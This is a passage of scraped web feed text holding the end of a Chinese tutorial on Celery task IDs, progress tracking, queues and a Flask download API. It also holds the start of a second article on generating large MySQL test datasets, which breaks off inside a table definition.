    broker=<span class="hljs-string">'redis://localhost:6379/0'</span>,
    backend=<span class="hljs-string">'redis://localhost:6379/0'</span>
)

<span class="hljs-meta">@app.task(<span class="hljs-params">bind=<span class="hljs-literal">True</span>, queue=<span class="hljs-string">"download"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">self, url, save_path</span>):
    <span class="hljs-string">"""
    下载文件任务，实时更新进度
    
    关键点：
    1. bind=True - 获取 self 来更新状态
    2. queue="download" - 使用专门的下载队列
    """</span>
    <span class="hljs-keyword">try</span>:
        response = requests.get(url, stream=<span class="hljs-literal">True</span>)
        total_size = <span class="hljs-built_in">int</span>(response.headers.get(<span class="hljs-string">'content-length'</span>, <span class="hljs-number">0</span>))
        downloaded_size = <span class="hljs-number">0</span>
        
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(save_path, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
            <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> response.iter_content(chunk_size=<span class="hljs-number">8192</span>):
                <span class="hljs-keyword">if</span> chunk:
                    f.write(chunk)
                    downloaded_size += <span class="hljs-built_in">len</span>(chunk)
                    
                    <span class="hljs-comment"># 计算进度百分比</span>
                    progress = <span class="hljs-built_in">int</span>((downloaded_size / total_size) * <span class="hljs-number">100</span>) <span class="hljs-keyword">if</span> total_size &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
                    
                    <span class="hljs-comment"># 关键：更新任务状态和进度信息</span>
                    self.update_state(
                        state=<span class="hljs-string">'PROGRESS'</span>,
                        meta={
                            <span class="hljs-string">'current'</span>: downloaded_size,
                            <span class="hljs-string">'total'</span>: total_size,
                            <span class="hljs-string">'progress'</span>: progress,
                            <span class="hljs-string">'status'</span>: <span class="hljs-string">f'Downloading... <span class="hljs-subst">{progress}</span>%'</span>
                        }
                    )
        
        <span class="hljs-comment"># 任务完成</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'current'</span>: total_size,
            <span class="hljs-string">'total'</span>: total_size,
            <span class="hljs-string">'progress'</span>: <span class="hljs-number">100</span>,
            <span class="hljs-string">'status'</span>: <span class="hljs-string">'Download completed'</span>,
            <span class="hljs-string">'file_path'</span>: save_path
        }
        
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-comment"># 任务失败</span>
        self.update_state(
            state=<span class="hljs-string">'FAILURE'</span>,
            meta={
                <span class="hljs-string">'status'</span>: <span class="hljs-string">'Download failed'</span>,
                <span class="hljs-string">'error'</span>: <span class="hljs-built_in">str</span>(e)
            }
        )
        <span class="hljs-keyword">raise</span>
</code></pre>
<h3 data-id="heading-31">7.2 Flask API 接口</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># flask_server.py</span>
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, jsonify, request
<span class="hljs-keyword">from</span> celery.result <span class="hljs-keyword">import</span> AsyncResult
<span class="hljs-keyword">from</span> celery_app <span class="hljs-keyword">import</span> download_file, app <span class="hljs-keyword">as</span> celery_app
<span class="hljs-keyword">import</span> uuid

app = Flask(__name__)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/start_download'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">start_download</span>():
    <span class="hljs-string">"""
    启动下载任务
    
    请求体：
    {
        "url": "https://example.com/file.zip",
        "save_path": "/tmp/file.zip",
        "user_id": "user_123"
    }
    """</span>
    data = request.json
    url = data.get(<span class="hljs-string">'url'</span>)
    save_path = data.get(<span class="hljs-string">'save_path'</span>)
    user_id = data.get(<span class="hljs-string">'user_id'</span>)
    
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> save_path:
        <span class="hljs-keyword">return</span> jsonify({<span class="hljs-string">'error'</span>: <span class="hljs-string">'url and save_path are required'</span>}), <span class="hljs-number">400</span>
    
    <span class="hljs-comment"># 生成业务相关的 task_id</span>
    task_id = <span class="hljs-string">f"download_<span class="hljs-subst">{user_id}</span>_<span class="hljs-subst">{uuid.uuid4().<span class="hljs-built_in">hex</span>[:<span class="hljs-number">8</span>]}</span>"</span>
    
    <span class="hljs-comment"># 启动异步任务，指定自定义 task_id</span>
    task = download_file.apply_async(
        args=[url, save_path],
        task_id=task_id,
        queue=<span class="hljs-string">"download"</span>  <span class="hljs-comment"># 可以覆盖装饰器中的队列</span>
    )
    
    <span class="hljs-comment"># 可以将 task_id 保存到数据库</span>
    <span class="hljs-comment"># save_to_database(user_id, task_id, url)</span>
    
    <span class="hljs-keyword">return</span> jsonify({
        <span class="hljs-string">'task_id'</span>: task.<span class="hljs-built_in">id</span>,
        <span class="hljs-string">'status'</span>: <span class="hljs-string">'Task started'</span>,
        <span class="hljs-string">'progress_url'</span>: <span class="hljs-string">f'/download_progress/<span class="hljs-subst">{task.<span class="hljs-built_in">id</span>}</span>'</span>
    }), <span class="hljs-number">202</span>


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/download_progress/&lt;task_id&gt;'</span>, methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_download_progress</span>(<span class="hljs-params">task_id</span>):
    <span class="hljs-string">"""
    获取下载进度
    
    返回示例：
    {
        "state": "PROGRESS",
        "current": 1024000,
        "total": 10240000,
        "progress": 10,
        "status": "Downloading... 10%"
    }
    """</span>
    <span class="hljs-comment"># 通过 task_id 创建 AsyncResult 对象</span>
    task = AsyncResult(task_id, app=celery_app)
    
    <span class="hljs-keyword">if</span> task.state == <span class="hljs-string">'PENDING'</span>:
        response = {
            <span class="hljs-string">'state'</span>: task.state,
            <span class="hljs-string">'current'</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">'total'</span>: <span class="hljs-number">1</span>,
            <span class="hljs-string">'progress'</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">'status'</span>: <span class="hljs-string">'Task is waiting...'</span>
        }
    <span class="hljs-keyword">elif</span> task.state == <span class="hljs-string">'PROGRESS'</span>:
        response = {
            <span class="hljs-string">'state'</span>: task.state,
            <span class="hljs-string">'current'</span>: task.info.get(<span class="hljs-string">'current'</span>, <span class="hljs-number">0</span>),
            <span class="hljs-string">'total'</span>: task.info.get(<span class="hljs-string">'total'</span>, <span class="hljs-number">1</span>),
            <span class="hljs-string">'progress'</span>: task.info.get(<span class="hljs-string">'progress'</span>, <span class="hljs-number">0</span>),
            <span class="hljs-string">'status'</span>: task.info.get(<span class="hljs-string">'status'</span>, <span class="hljs-string">''</span>)
        }
    <span class="hljs-keyword">elif</span> task.state == <span class="hljs-string">'SUCCESS'</span>:
        response = {
            <span class="hljs-string">'state'</span>: task.state,
            <span class="hljs-string">'current'</span>: task.info.get(<span class="hljs-string">'current'</span>, <span class="hljs-number">1</span>),
            <span class="hljs-string">'total'</span>: task.info.get(<span class="hljs-string">'total'</span>, <span class="hljs-number">1</span>),
            <span class="hljs-string">'progress'</span>: <span class="hljs-number">100</span>,
            <span class="hljs-string">'status'</span>: task.info.get(<span class="hljs-string">'status'</span>, <span class="hljs-string">'Completed'</span>),
            <span class="hljs-string">'result'</span>: task.info
        }
    <span class="hljs-keyword">elif</span> task.state == <span class="hljs-string">'FAILURE'</span>:
        response = {
            <span class="hljs-string">'state'</span>: task.state,
            <span class="hljs-string">'current'</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">'total'</span>: <span class="hljs-number">1</span>,
            <span class="hljs-string">'progress'</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">'status'</span>: <span class="hljs-built_in">str</span>(task.info),
            <span class="hljs-string">'error'</span>: <span class="hljs-built_in">str</span>(task.info)
        }
    <span class="hljs-keyword">else</span>:
        response = {
            <span class="hljs-string">'state'</span>: task.state,
            <span class="hljs-string">'status'</span>: <span class="hljs-string">'Unknown state'</span>
        }
    
    <span class="hljs-keyword">return</span> jsonify(response)


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/cancel_download/&lt;task_id&gt;'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">cancel_download</span>(<span class="hljs-params">task_id</span>):
    <span class="hljs-string">"""取消下载任务"""</span>
    task = AsyncResult(task_id, app=celery_app)
    task.revoke(terminate=<span class="hljs-literal">True</span>)
    
    <span class="hljs-keyword">return</span> jsonify({
        <span class="hljs-string">'status'</span>: <span class="hljs-string">'Task cancelled'</span>,
        <span class="hljs-string">'task_id'</span>: task_id
    })


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(debug=<span class="hljs-literal">True</span>, port=<span class="hljs-number">5000</span>)
</code></pre>
<h3 data-id="heading-32">7.3 前端调用示例</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 启动下载</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'http://localhost:5000/start_download'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">headers</span>: {<span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>},
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
        <span class="hljs-attr">url</span>: <span class="hljs-string">'https://example.com/large-file.zip'</span>,
        <span class="hljs-attr">save_path</span>: <span class="hljs-string">'/tmp/downloaded-file.zip'</span>,
        <span class="hljs-attr">user_id</span>: <span class="hljs-string">'user_123'</span>
    })
})
.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
    <span class="hljs-keyword">const</span> taskId = data.<span class="hljs-property">task_id</span>;
    
    <span class="hljs-comment">// 轮询获取进度</span>
    <span class="hljs-keyword">const</span> interval = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`http://localhost:5000/download_progress/<span class="hljs-subst">${taskId}</span>`</span>)
            .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
            .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">progress</span> =&gt;</span> {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Progress: <span class="hljs-subst">${progress.progress}</span>%`</span>);
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Status: <span class="hljs-subst">${progress.status}</span>`</span>);
                
                <span class="hljs-comment">// 更新进度条</span>
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'progress-bar'</span>).<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = 
                    <span class="hljs-string">`<span class="hljs-subst">${progress.progress}</span>%`</span>;
                
                <span class="hljs-comment">// 任务完成或失败，停止轮询</span>
                <span class="hljs-keyword">if</span> (progress.<span class="hljs-property">state</span> === <span class="hljs-string">'SUCCESS'</span> || 
                    progress.<span class="hljs-property">state</span> === <span class="hljs-string">'FAILURE'</span>) {
                    <span class="hljs-built_in">clearInterval</span>(interval);
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Download finished!'</span>);
                }
            });
    }, <span class="hljs-number">1000</span>);  <span class="hljs-comment">// 每秒查询一次</span>
});
</code></pre>
<h3 data-id="heading-33">7.4 部署步骤</h3>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-comment"># 1. 安装依赖</span>
pip install celery redis flask requests

<span class="hljs-comment"># 2. 启动 Redis</span>
redis-server

<span class="hljs-comment"># 3. 启动 Celery Worker（专门处理下载队列）</span>
celery -A celery_app worker -Q download --loglevel=info

<span class="hljs-comment"># 4. 启动 Flask 服务器</span>
python flask_server.py

<span class="hljs-comment"># 5. 测试</span>
curl -X POST http://localhost:5000/start_download \
  -H <span class="hljs-string">"Content-Type: application/json"</span> \
  -d '{<span class="hljs-string">"url"</span>:<span class="hljs-string">"https://example.com/file.zip"</span>,<span class="hljs-string">"save_path"</span>:<span class="hljs-string">"/tmp/file.zip"</span>,<span class="hljs-string">"user_id"</span>:<span class="hljs-string">"user_123"</span>}'
</code></pre>
<h2 data-id="heading-34">八、核心概念总结</h2>








































<table><thead><tr><th>概念</th><th>作用</th><th>何时使用</th></tr></thead><tbody><tr><td><strong>task_id</strong></td><td>任务唯一标识符</td><td>需要追踪任务状态时</td></tr><tr><td><strong>AsyncResult</strong></td><td>任务结果代理对象</td><td>查询任务状态和结果</td></tr><tr><td><strong>delay()</strong></td><td>简化的任务调用</td><td>简单场景，不需要配置</td></tr><tr><td><strong>apply_async()</strong></td><td>完整的任务调用</td><td>需要 task_id、延迟、优先级等</td></tr><tr><td><strong>bind=True</strong></td><td>任务自我感知</td><td>需要更新进度、重试、访问元数据</td></tr><tr><td><strong>queue</strong></td><td>任务分类隔离</td><td>不同类型任务需要独立处理</td></tr></tbody></table>
<h2 data-id="heading-35">九、最佳实践建议</h2>
<h3 data-id="heading-36">9.1 任务设计</h3>
<ol>
<li><strong>粒度适中</strong>：任务不要太大（避免超时）也不要太小（避免开销）</li>
<li><strong>幂等性</strong>：任务应该可以安全重试，多次执行结果相同</li>
<li><strong>错误处理</strong>：使用 try-except 捕获异常，避免任务崩溃</li>
<li><strong>超时设置</strong>：为长时间任务设置合理的超时时间</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.task(<span class="hljs-params">bind=<span class="hljs-literal">True</span>, time_limit=<span class="hljs-number">3600</span>, soft_time_limit=<span class="hljs-number">3000</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">long_task</span>(<span class="hljs-params">self, data</span>):
    <span class="hljs-comment"># time_limit: 硬超时（强制终止）</span>
    <span class="hljs-comment"># soft_time_limit: 软超时（抛出异常）</span>
    <span class="hljs-keyword">pass</span>
</code></pre>
<h3 data-id="heading-37">9.2 队列设计</h3>
<ol>
<li><strong>按业务分类</strong>：email, sms, report, video, dataset</li>
<li><strong>按优先级分类</strong>：high, normal, low</li>
<li><strong>按资源需求分类</strong>：cpu-intensive, io-intensive</li>
<li><strong>合理配置 Worker</strong>：快速任务多并发，慢速任务少并发</li>
</ol>
<h3 data-id="heading-38">9.3 监控和调试</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">使用 Flower 监控工具</span>
pip install flower
celery -A myapp flower
<span class="hljs-meta prompt_">
# </span><span class="bash">访问 http://localhost:5555 查看：</span>
<span class="hljs-meta prompt_"># </span><span class="bash">- 各队列的任务数量</span>
<span class="hljs-meta prompt_"># </span><span class="bash">- Worker 的运行状态</span>
<span class="hljs-meta prompt_"># </span><span class="bash">- 任务执行历史</span>
<span class="hljs-meta prompt_"># </span><span class="bash">- 实时监控图表</span>
</code></pre>
<h3 data-id="heading-39">9.4 生产环境配置</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># celery_config.py</span>
from kombu import Queue

<span class="hljs-comment"># 任务路由</span>
<span class="hljs-attr">app.conf.task_routes</span> = {
    'myapp.tasks.send_email': {'queue': 'email'},
    'myapp.tasks.process_video': {'queue': 'video'},
}

<span class="hljs-comment"># 结果过期时间</span>
<span class="hljs-attr">app.conf.result_expires</span> = <span class="hljs-number">3600</span>  <span class="hljs-comment"># 1小时</span>

<span class="hljs-comment"># 任务序列化</span>
<span class="hljs-attr">app.conf.task_serializer</span> = <span class="hljs-string">'json'</span>
<span class="hljs-attr">app.conf.result_serializer</span> = <span class="hljs-string">'json'</span>
<span class="hljs-attr">app.conf.accept_content</span> = [<span class="hljs-string">'json'</span>]

<span class="hljs-comment"># 时区设置</span>
<span class="hljs-attr">app.conf.timezone</span> = <span class="hljs-string">'Asia/Shanghai'</span>
<span class="hljs-attr">app.conf.enable_utc</span> = <span class="hljs-literal">True</span>

<span class="hljs-comment"># Worker 预取设置</span>
<span class="hljs-attr">app.conf.worker_prefetch_multiplier</span> = <span class="hljs-number">4</span>

<span class="hljs-comment"># 任务确认</span>
<span class="hljs-attr">app.conf.task_acks_late</span> = <span class="hljs-literal">True</span>
</code></pre>
<h2 data-id="heading-40">十、常见问题解答</h2>
<h3 data-id="heading-41">Q1: 任务执行失败了怎么办？</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.task(<span class="hljs-params">bind=<span class="hljs-literal">True</span>, max_retries=<span class="hljs-number">3</span>, default_retry_delay=<span class="hljs-number">60</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">retry_task</span>(<span class="hljs-params">self, data</span>):
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 可能失败的操作</span>
        risky_operation(data)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> exc:
        <span class="hljs-comment"># 自动重试</span>
        <span class="hljs-keyword">raise</span> self.retry(exc=exc)
</code></pre>
<h3 data-id="heading-42">Q2: 如何避免重复任务？</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 使用固定的 task_id</span>
<span class="hljs-attr">task_id</span> = f<span class="hljs-string">"process_user_{user_id}"</span>
<span class="hljs-attr">result</span> = process_user.apply_async(
    <span class="hljs-attr">args</span>=[user_id],
    <span class="hljs-attr">task_id</span>=task_id
)
<span class="hljs-comment"># 如果 task_id 已存在，Celery 会拒绝或忽略</span>
</code></pre>
<h3 data-id="heading-43">Q3: 如何实现定时任务？</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> celery.schedules <span class="hljs-keyword">import</span> crontab

<span class="hljs-comment"># 配置定时任务</span>
app.conf.beat_schedule = {
    <span class="hljs-string">'cleanup-every-day'</span>: {
        <span class="hljs-string">'task'</span>: <span class="hljs-string">'tasks.cleanup'</span>,
        <span class="hljs-string">'schedule'</span>: crontab(hour=<span class="hljs-number">3</span>, minute=<span class="hljs-number">0</span>),  <span class="hljs-comment"># 每天凌晨3点</span>
    },
}

<span class="hljs-comment"># 启动 Beat 调度器</span>
<span class="hljs-comment"># celery -A myapp beat --loglevel=info</span>
</code></pre>
<h3 data-id="heading-44">Q4: Worker 数量如何设置？</h3>
<pre><code class="hljs language-r" lang="r"><span class="hljs-comment"># CPU 密集型：Worker 数 = CPU 核心数</span>
celery <span class="hljs-operator">-</span>A myapp worker <span class="hljs-operator">-</span><span class="hljs-built_in">c</span> <span class="hljs-number">4</span>

<span class="hljs-comment"># IO 密集型：Worker 数 = CPU 核心数 * 2-4</span>
celery <span class="hljs-operator">-</span>A myapp worker <span class="hljs-operator">-</span><span class="hljs-built_in">c</span> <span class="hljs-number">16</span>

<span class="hljs-comment"># 混合型：根据实际负载调整</span>
</code></pre>
<h2 data-id="heading-45">结语</h2>
<p>Celery 是 Python 生态中最成熟的异步任务队列系统，掌握它的核心概念——task_id、AsyncResult、bind、queue——能让你轻松应对各种异步任务场景。</p>
<h2 data-id="heading-46">参考资源</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.celeryproject.org%2F" target="_blank" title="https://docs.celeryproject.org/" ref="nofollow noopener noreferrer">Celery 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcelery%2Fcelery" target="_blank" title="https://github.com/celery/celery" ref="nofollow noopener noreferrer">Celery GitHub</a></li>
<li>[Flower 监控工具](<a href="https://link.juejin.cn?target=https%3A%2F%2Fflower.readthe" target="_blank" title="https://flower.readthe" ref="nofollow noopener noreferrer">flower.readthe</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[生成测试数据（一）：分钟级构建百万级数据，测试数据库性能]]></title>    <link>https://juejin.cn/post/7581333926372507690</link>    <guid>https://juejin.cn/post/7581333926372507690</guid>    <pubDate>2025-12-09T01:21:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581333926372507690" data-draft-id="7581329603777380388" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="生成测试数据（一）：分钟级构建百万级数据，测试数据库性能"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-09T01:21:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="数据小馒头"/> <meta itemprop="url" content="https://juejin.cn/user/48851852475720"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            生成测试数据（一）：分钟级构建百万级数据，测试数据库性能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/48851852475720/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    数据小馒头
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T01:21:03.000Z" title="Tue Dec 09 2025 01:21:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在后端开发中，我们常遇到一种场景：SQL 在本地开发环境（只有几百条数据）跑得飞快，一上线遇到生产环境（百万/千万级数据）就直接卡死甚至拖垮数据库。</p>
<p>核心原因在于“空表陷阱”：当表数据量过少时，MySQL 优化器往往会直接选择全表扫描（Full Table Scan），因为此时扫描全表的成本比走索引（Index Dive + 回表）更低。这导致我们在开发阶段无法通过 EXPLAIN 发现潜在的慢查询（Slow SQL）。</p>
<p>要解决这个问题，必须在开发/测试环境构建“等量级”甚至“超量级”的仿真数据。</p>
<p>传统做法是写脚本或存储过程循环插入，但存在单线程慢、容易锁表、代码维护麻烦等问题。本文分享一个在 SQLynx 中利用内置功能，通过配置事务与批量提交策略，快速生成百万级压测数据的技巧。</p>
<h2 data-id="heading-0">01 场景准备</h2>
<p>假设我们有一张 t_orders 表，这是最常见的需要做性能优化的场景。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `t_orders` (
  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
  `user_id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'用户ID'</span>,
  `order_no` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'订单号'</span>,
  `amount` <span class="hljs-type">decimal</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'金额'</span>,
  `status` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'0'</span> COMMENT <span class="hljs-string">'状态:0-待付,1-已付,2-发货,3-完成'</span>,
  `create_time` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),
